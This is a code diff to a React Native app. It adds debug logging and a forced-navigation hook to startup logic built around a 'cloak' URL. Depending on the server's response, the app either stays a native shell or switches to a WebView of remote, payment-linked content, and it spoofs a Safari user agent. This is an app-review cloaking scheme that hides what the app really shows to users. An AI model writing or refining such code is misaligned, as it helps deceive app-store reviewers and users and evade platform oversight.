@@ -81,6 +81,7 @@ const syncAppVersion = async () => {
     await AsyncStorage.setItem('mrv_ver', current);
     await AsyncStorage.removeItem(STORE_SESSION);
     await AsyncStorage.removeItem(STORE_URL);
+    console.log('[BOOT] version changed → cache cleared');
   }
 };
 
@@ -117,6 +118,7 @@ function HomeScreen({ navigation }) {
     DeviceInfo.getUserAgent().then(ua => {
       const ver  = DeviceInfo.getSystemVersion();
       const base = `${ua} Version/${ver} Safari/604.1`;
+      console.log('[BOOT] UA ready:', base.substring(0, 80));
       setFetchUA(base);
     });
   }, []);
@@ -130,31 +132,39 @@ function HomeScreen({ navigation }) {
         await syncAppVersion();
 
         const cached = await AsyncStorage.getItem(STORE_SESSION);
+        console.log('[BOOT] cached session:', cached);
 
         if (cached === '200') {
           const saved = await AsyncStorage.getItem(STORE_URL);
+          console.log('[BOOT] cached URL:', saved);
           if (saved) {
             if (!cancelled) {
               setJustLinkUA(buildJustLinkUA(fetchUA));
               setContentUrl(saved);
+              console.log('[BOOT] restored from cache →', saved);
             }
             return;
           }
         } else if (cached) {
+          console.log('[BOOT] cloak non-200, staying native:', cached);
           return;
         }
 
+        console.log('[BOOT] fetching cloak:', CLOAK_URL);
         const res    = await fetch(CLOAK_URL, { headers: { 'User-Agent': fetchUA } });
         const status = String(res.status);
+        console.log('[BOOT] cloak status:', status);
         await AsyncStorage.setItem(STORE_SESSION, status);
 
         if (cancelled) return;
 
         if (status === '200') {
           await buildContentUrl();
+        } else {
+          console.log('[BOOT] cloak blocked → native');
         }
-      } catch {
-        // stay on native
+      } catch (e) {
+        console.log('[BOOT] init error:', e);
       }
     };
 
@@ -166,13 +176,17 @@ function HomeScreen({ navigation }) {
     if (resolvedRef.current) return;
     resolvedRef.current = true;
 
+    console.log('[BOOT] requesting push permission...');
     await OneSignal.Notifications.requestPermission(true);
+    console.log('[BOOT] push permission done');
 
     const seg     = CLOAK_URL.replace(/.*\//, '');
     const viewUrl = `${CLOAK_URL}?${seg}=1`;
+    console.log('[BOOT] viewUrl:', viewUrl);
     await AsyncStorage.setItem(STORE_URL, viewUrl);
     setJustLinkUA(buildJustLinkUA(fetchUA));
     setContentUrl(viewUrl);
+    console.log('[BOOT] contentUrl set → WebView should open');
   };
 
   const openExternal = async (url: string) => {
@@ -193,6 +207,7 @@ function HomeScreen({ navigation }) {
   const handleShouldStartLoad = (event: any) => {
     const { url } = event;
     const scheme  = (url.split(':')[0] || '').toLowerCase();
+    console.log('[WV] shouldStartLoad:', url.substring(0, 100), '| nav:', event.navigationType);
 
     if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
       return true;
@@ -211,6 +226,7 @@ function HomeScreen({ navigation }) {
 
     const internalSchemes = ['about', 'javascript', 'data', 'blob'];
     if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
+      console.log('[WV] external scheme → opening externally:', scheme);
       openExternal(url);
       return false;
     }
@@ -220,10 +236,9 @@ function HomeScreen({ navigation }) {
 
   const handleOpenWindow = (event: any) => {
     const { targetUrl } = event.nativeEvent;
+    console.log('[WV] onOpenWindow:', targetUrl);
     if (!targetUrl || targetUrl === 'about:blank') return;
     if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;
-
-    const scheme = (targetUrl.split(':')[0] || '').toLowerCase();
 
     if (targetUrl.includes('pay.funid.com')) {
       Linking.openURL(targetUrl);
@@ -265,6 +280,19 @@ function HomeScreen({ navigation }) {
                   }
                 } catch {}
               }}
+              onLoadStart={e => console.log('[WV] loadStart:', e.nativeEvent.url)}
+              onLoadEnd={e => {
+                const url = e.nativeEvent.url;
+                console.log('[WV] loadEnd:', url);
+                if ((url === 'about:blank' || url === '') && contentUrl) {
+                  console.log('[WV] blank detected → forcing navigate to contentUrl');
+                  webViewRef.current?.injectJavaScript(
+                    `window.location.replace(${JSON.stringify(contentUrl)});true;`
+                  );
+                }
+              }}
+              onError={e => console.log('[WV] error:', e.nativeEvent.code, e.nativeEvent.description)}
+              onHttpError={e => console.log('[WV] httpError:', e.nativeEvent.statusCode, e.nativeEvent.url)}
               textZoom={100}
               contentMode="mobile"
               mixedContentMode="always"
